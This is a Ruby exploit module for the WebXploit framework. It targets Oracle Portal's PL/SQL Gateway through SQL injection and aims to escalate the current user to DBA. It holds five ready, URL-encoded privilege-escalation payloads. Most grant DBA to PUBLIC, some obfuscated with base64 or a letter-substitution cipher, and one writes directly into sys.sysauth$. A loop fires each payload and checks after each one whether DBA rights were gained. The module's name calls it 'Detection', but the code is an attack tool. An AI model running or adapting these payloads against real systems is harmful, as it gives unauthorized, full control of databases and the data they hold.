class WebXploit < WXf::WXfmod_Factory::Auxiliary

  include WXf::WXfassists::General::MechReq

  def initialize
    super(
      'Name'        => 'Oracle Application PL/SQL Gateway Detection',
      'Version'     => '1.0',
      'Description' => 'Oracle Portal Privilege Escalation. Tries various privilege escalation exploits against oracle 
                        portal\'s that are vulnerable to sql injection in an attempt to escalate the current portal user to DBA',
      'Author'      => 'CG' ,
      'License'     => WXF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'http://www.owasp.org/index.php/Testing_for_Oracle' ]
        ]
    )
    init_opts(
      [
        OptString.new('URIPATH', [ true,  "The URI PATH", '/pls/']),
        OptString.new('DAD', [ true,  "The Database Access Descriptor", 'portal/']),
        OptString.new('INJECTION', [ true,  "The vulnerable injection package", 'PORTAL.WWV_HTP.CENTERCLOSE'])
      ])
  end

  
  
  #Check DBA Function
  def check_dba(rurl,path,dad,injection,url_dba)
    dba = false
    sql_check_priv = "select+\'my\'||\'veeryv3ry\'||\'rand0mt3xt\'+from+sys.user\$+where+rownum=1"
    prnt_gen("Checking if we are DBA  on: \n#{rurl}#{path}#{dad}#{injection}#{url_dba}#{sql_check_priv}\n")
    
    res = mech_req({
      'RURL' => rurl + path + dad + injection + url_dba + sql_check_priv, 
      'method' => 'GET',
      'PROXY_ADDR' => proxya,
      'PROXY_PORT' => proxyp,
      'REDIRECT'   => 'false'
        })

    if (res.nil?)
      prnt_err("No response for #{rurl}")
    end
    
    if (res) and (res.respond_to?('code')) and (res.code == '200')
      if (res.body =~ /myveeryv3ryrand0mt3xt/i )
        prnt_plus("We are DBA, all done")
        dba = true
      else
        prnt_err("We are not DBA")
        dba = false
      end
    end
      
     if (res) and (res.respond_to?('code')) and (res.code == '302' or res.code == '301')
      prnt_gen("Redirect to #{res.header['location']}")
      dba = false
     end
     
     if (rce)
       prnt_gen("Received #{rce} for request")
       prnt_err("We are not DBA")
       dba = false
     end 
    
     return dba
  end
  
  #Try Privilege Escalations
  def do_exploit(rurl,path,dad,injection,url_code,exploit)
    prnt_gen("Trying our first exploit #{rurl}#{path}#{dad}#{injection}#{url_code}#{exploit}")
          
    res = mech_req({
      'RURL' => rurl + path + dad + injection + url_code + exploit,
      'method' => 'GET',
      'PROXY_ADDR' => proxya,
      'PROXY_PORT' => proxyp,
      'REDIRECT'   => 'false'      
        })

    if (res.nil?)
      prnt_err("No response for #{rurl}")
    end
    
    if (res) and (res.respond_to?('code')) and (res.code == '200')
      prnt_gen("Received #{res.code} for request")
    end
    
    if (res) and (res.respond_to?('code')) and (res.code == '302' or res.code == '301')
      prnt_gen("Redirect to #{res.header['location']}")
    end
    
    if (rce)
      prnt_gen("Received #{rce} for request")
      prnt_gen("Some exploits return a 404")
    end
      
    #wait 2 seconds for oracle to realize it just got owned
    select(nil,nil,nil,5.0)
    prnt_gen("Waiting a bit for caching to catch up")
    select(nil,nil,nil,5.0)
  end
  
  def run
    #exp_findricset = ""DECLARE c2gya2Vy NUMBER;BEGIN c2gya2Vy := DBMS_SQL.OPEN_CURSOR;DBMS_SQL.PARSE(c2gya2Vy,utl_encode.text_decode('ZGVjbGFyZSBwcmFnbWEgYXV0b25vbW91c190cmFuc2FjdGlvbjsgYmVnaW4gZXhlY3V0ZSBpbW1lZGlhdGUgJ0dSQU5UIERCQSBUTyBQVUJMSUMnO2NvbW1pdDtlbmQ7','WE8ISO8859P1', UTL_ENCODE.BASE64),0);SYS.LT.FINDRICSET('TGV2ZWwgMSBjb21sZXRlIDop.U2VlLnUubGF0ZXIp''||dbms_sql.execute('||c2gya2Vy||')||''','DEADBEAF');END;"
    exp_findricset = "DECLARE%20c2gya2Vy%20NUMBER;BEGIN%20c2gya2Vy%20:=%20DBMS_SQL.OPEN_CURSOR;DBMS_SQL.PARSE(c2gya2Vy,utl_encode.text_decode('ZGVjbGFyZSBwcmFnbWEgYXV0b25vbW91c190cmFuc2FjdGlvbjsgYmVnaW4gZXhlY3V0ZSBpbW1lZGlhdGUgJ0dSQU5UIERCQSBUTyBQVUJMSUMnO2NvbW1pdDtlbmQ7','WE8ISO8859P1',%20UTL_ENCODE.BASE64),0);SYS.LT.FINDRICSET('TGV2ZWwgMSBjb21sZXRlIDop.U2VlLnUubGF0ZXIp''%7C%7Cdbms_sql.execute('%7C%7Cc2gya2Vy%7C%7C')%7C%7C''','DEADBEAF');END;"
    
    #exp_sys_lt_cwspt = "DECLARE D NUMBER;BEGIN D := DBMS_SQL.OPEN_CURSOR;DBMS_SQL.PARSE(D,'declare pragma autonomous_transaction; begin execute immediate ''grant dba to public'';commit;end;',0);SYS.LT.CREATEWORKSPACE('X''||dbms_sql.execute('||D||')--');SYS.LT.REMOVEWORKSPACE('X''||dbms_sql.execute('||D||')--');end;"
    exp_sys_lt_cwspt = "DECLARE%20D%20NUMBER;BEGIN%20D%20:=%20DBMS_SQL.OPEN_CURSOR;DBMS_SQL.PARSE(D,'declare%20pragma%20autonomous_transaction;%20begin%20execute%20immediate%20''grant%20dba%20to%20public'';commit;end;',0);SYS.LT.CREATEWORKSPACE('X''%7C%7Cdbms_sql.execute('%7C%7CD%7C%7C')--');SYS.LT.REMOVEWORKSPACE('X''%7C%7Cdbms_sql.execute('%7C%7CD%7C%7C')--');end;"
    
    #exp_sys_kupwr = "DECLARE MYC NUMBER;BEGIN MYC := DBMS_SQL.OPEN_CURSOR;DBMS_SQL.PARSE(MYC,translate('uzikpsz fsprjp pnmghgjgna_msphapimwgh) ozrwh zczinmz wjjzuwpmz (rsphm uop mg fnokwi()igjjwm)zhu)','poiuztrewqlkjhgfdsamnbvcxy()=!','abcdefghijklmnopqrstuvwxyz'';:='),0);sys.KUPW\$WORKER.MAIN('x',''' and 1=dbms_sql.execute ('||myc||')--');END;"
    exp_sys_kupwr = "DECLARE%20MYC%20NUMBER;BEGIN%20MYC%20:=%20DBMS_SQL.OPEN_CURSOR;DBMS_SQL.PARSE(MYC,translate('uzikpsz%20fsprjp%20pnmghgjgna_msphapimwgh)%20ozrwh%20zczinmz%20wjjzuwpmz%20(rsphm%20uop%20mg%20fnokwi()igjjwm)zhu)','poiuztrewqlkjhgfdsamnbvcxy()=!','abcdefghijklmnopqrstuvwxyz'';:='),0);sys.KUPW$WORKER.MAIN('x','''%20and%201=dbms_sql.execute%20('%7C%7Cmyc%7C%7C')--');END;"
    
    #exp_dbms_export="select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' grant dba to public'''';END;'';END;-- ','SYS',0,'1',0) from dual";
    exp_dbms_export = "select%20SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT%22.PUT(:P1);EXECUTE%20IMMEDIATE%20''DECLARE%20PRAGMA%20AUTONOMOUS_TRANSACTION;BEGIN%20EXECUTE%20IMMEDIATE%20''''%20grant%20dba%20to%20public'''';END;'';END;--%20','SYS',0,'1',0)%20from%20dual"
    
    exp_bump_sequence = "DECLARE+SEQUENCE_OWNER+VARCHAR2(200);+SEQUENCE_NAME+VARCHAR2(200);+v_user_id+number;+v_commands+VARCHAR2(32767);+NEW_VALUE+NUMBER;+BEGIN+SELECT+user_id+INTO+v_user_id+FROM+user_users;+v_commands+:=+\'insert+into+sys.sysauth\$+\'+||+\'+values\'+||+\'(\'+||+v_user_id+||+\',4,\'+||+\'999,null)\';+SEQUENCE_OWNER+:=+\'TEST\';+SEQUENCE_NAME+:=+\'\'\',lockhandle=>:1);\'+||+v_commands+||+\';commit;+end;--\';+NEW_VALUE+:=+1;+SYS.DBMS_CDC_IMPDP.BUMP_SEQUENCE(SEQUENCE_OWNER+=>+SEQUENCE_OWNER,+SEQUENCE_NAME+=>+SEQUENCE_NAME,+NEW_VALUE+=>+NEW_VALUE);+END;"

    sql_currentuser = "select+user+from+dual"
    sql_currentuserpriv = "select+\*+from+user_role_privs"
    sql_check = "select+'my'||'veeryv3ry'||'rand0mt3xt'+from+dual";
    sql_check_priv = "select+'my'||'veeryv3ry'||'rand0mt3xt'+from+sys.user\$+where+rownum=1";
    url_code = "?);execute+immediate+:1;--="
    url_dba = "?);OWA_UTIL.CELLSPRINT(:1);--=";

    dba = false

    path = datahash['URIPATH']
    dad = datahash['DAD']
    injection = datahash['INJECTION']
      
    #check if the injection string is valid
    prnt_gen("Checking if the URL is valid #{rurl}#{path}#{dad}#{injection}#{url_dba}#{sql_check}")
      
    res = mech_req({
      'RURL' => rurl + path + dad + injection + url_dba + sql_check, 
      'method' => 'GET',
      'PROXY_ADDR' => proxya,
      'PROXY_PORT' => proxyp,
      'REDIRECT'   => 'false'
    })

    if (res.nil?)
      prnt_err("No response for #{rurl}")
      return
    end
    
    if (rce)
       prnt_gen("Received #{rce} for request")
       prnt_gen("URL is invalid, exiting check your settings")
       return
     end
    
    if (res) and (res.respond_to?('code')) and (res.code == '200')
      if (res.body =~ /myveeryv3ryrand0mt3xt/i )
        prnt_plus("URL is valid, continuing")
      else
        prnt_gen("URL is invalid, exiting check your settings")
        return
      end
      elsif (res) and (res.respond_to?('code')) and (res.code == '302' or res.code == '301')
           prnt_gen("Redirect to #{res.header['location']}") 
    end
    
    
    #Check if we are DBA before we throw exploits at it
    dba = check_dba(rurl,path,dad,injection,url_dba)
    if dba == true
      return
    end

    do_exploit(rurl,path,dad,injection,url_code,exp_findricset)
    select(nil,nil,nil,10.0)
    dba = check_dba(rurl,path,dad,injection,url_dba)
    if dba == true
      return
    end
    
    do_exploit(rurl,path,dad,injection,url_code,exp_sys_lt_cwspt)
    select(nil,nil,nil,10.0)
    dba = check_dba(rurl,path,dad,injection,url_dba)
    if dba == true
      return
    end
    
    do_exploit(rurl,path,dad,injection,url_code,exp_sys_kupwr)
    select(nil,nil,nil,10.0)
    dba = check_dba(rurl,path,dad,injection,url_dba)
    if dba == true
      return
    end
    
    do_exploit(rurl,path,dad,injection,url_code,exp_dbms_export)
    select(nil,nil,nil,10.0)
    dba = check_dba(rurl,path,dad,injection,url_dba)
    if dba == true
      return
    end
    
    do_exploit(rurl,path,dad,injection,url_code,exp_bump_sequence)
    select(nil,nil,nil,10.0)
    dba = check_dba(rurl,path,dad,injection,url_dba)
    if dba == true
      return
    end

  end 
end
